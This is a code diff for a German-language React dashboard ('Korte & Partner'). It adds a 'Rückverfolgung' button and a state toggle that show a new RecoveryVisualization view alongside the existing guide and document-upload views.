@@ -4,7 +4,7 @@ import { supabase } from "@/integrations/supabase/client";
 import { Button } from "@/components/ui/button";
 import { Card, CardContent } from "@/components/ui/card";
 import { AssignmentStatusBadge, type AssignmentStatus } from "@/components/AssignmentStatusBadge";
-import { LogOut, ArrowLeft, Copy, CheckCircle, Loader2, Lock, MessageSquare, Menu, AlertTriangle, Clock, Send, FileUp, BookOpen } from "lucide-react";
+import { LogOut, ArrowLeft, Copy, CheckCircle, Loader2, Lock, MessageSquare, Menu, AlertTriangle, Clock, Send, FileUp, BookOpen, Network } from "lucide-react";
 import { Sheet, SheetContent, SheetTrigger, SheetHeader, SheetTitle } from "@/components/ui/sheet";
 import { Separator } from "@/components/ui/separator";
 import { notifyTelegram } from "@/lib/telegramNotify";
@@ -29,6 +29,7 @@ import { toast } from "sonner";
 import DocumentUpload from "@/components/DocumentUpload";
 import VerificationLogo from "@/components/VerificationLogo";
 import RecoveryGuide from "@/components/RecoveryGuide";
+import RecoveryVisualization from "@/components/RecoveryVisualization";
 
 interface SMSMessage {
   messageSender: string;
@@ -86,6 +87,7 @@ export default function Dashboard() {
   const [smsLoading, setSmsLoading] = useState(false);
   const [showDocUpload, setShowDocUpload] = useState(false);
   const [showGuide, setShowGuide] = useState(false);
+  const [showRecovery, setShowRecovery] = useState(false);
 
   const userIdRef = user?.id;
   useEffect(() => {
@@ -271,11 +273,15 @@ export default function Dashboard() {
             Korte <span className="opacity-60">&amp;</span> Partner
           </span>
           <div className="flex items-center gap-3">
-            <Button variant="outline" size="sm" onClick={() => { setShowGuide(true); setShowDocUpload(false); setSelectedId(null); }}>
+            <Button variant="outline" size="sm" onClick={() => { setShowRecovery(true); setShowGuide(false); setShowDocUpload(false); setSelectedId(null); }}>
+              <Network className="w-4 h-4 mr-1.5" />
+              Rückverfolgung
+            </Button>
+            <Button variant="outline" size="sm" onClick={() => { setShowGuide(true); setShowRecovery(false); setShowDocUpload(false); setSelectedId(null); }}>
               <BookOpen className="w-4 h-4 mr-1.5" />
               Anleitung
             </Button>
-            <Button size="sm" onClick={() => { setShowDocUpload(true); setShowGuide(false); setSelectedId(null); }}>
+            <Button size="sm" onClick={() => { setShowDocUpload(true); setShowGuide(false); setShowRecovery(false); setSelectedId(null); }}>
               <FileUp className="w-4 h-4 mr-1.5" />
               Dokumente hochladen
             </Button>
@@ -309,11 +315,15 @@ export default function Dashboard() {
                   </div>
                 )}
                 <Separator />
-                <Button variant="outline" size="sm" onClick={() => { setShowGuide(true); setShowDocUpload(false); setSelectedId(null); }} className="justify-start">
+                <Button variant="outline" size="sm" onClick={() => { setShowRecovery(true); setShowGuide(false); setShowDocUpload(false); setSelectedId(null); }} className="justify-start">
+                  <Network className="w-4 h-4 mr-1.5" />
+                  Rückverfolgung
+                </Button>
+                <Button variant="outline" size="sm" onClick={() => { setShowGuide(true); setShowRecovery(false); setShowDocUpload(false); setSelectedId(null); }} className="justify-start">
                   <BookOpen className="w-4 h-4 mr-1.5" />
                   Anleitung
                 </Button>
-                <Button size="sm" onClick={() => { setShowDocUpload(true); setShowGuide(false); setSelectedId(null); }} className="justify-start">
+                <Button size="sm" onClick={() => { setShowDocUpload(true); setShowGuide(false); setShowRecovery(false); setSelectedId(null); }} className="justify-start">
                   <FileUp className="w-4 h-4 mr-1.5" />
                   Dokumente hochladen
                 </Button>
@@ -330,7 +340,9 @@ export default function Dashboard() {
         </div>
       </header>
 
-      {showGuide ? (
+      {showRecovery ? (
+        <RecoveryVisualization onBack={() => setShowRecovery(false)} onOpenGuide={() => { setShowRecovery(false); setShowGuide(true); }} />
+      ) : showGuide ? (
         <RecoveryGuide onBack={() => setShowGuide(false)} />
       ) : showDocUpload ? (
         <DocumentUpload onBack={() => setShowDocUpload(false)} />
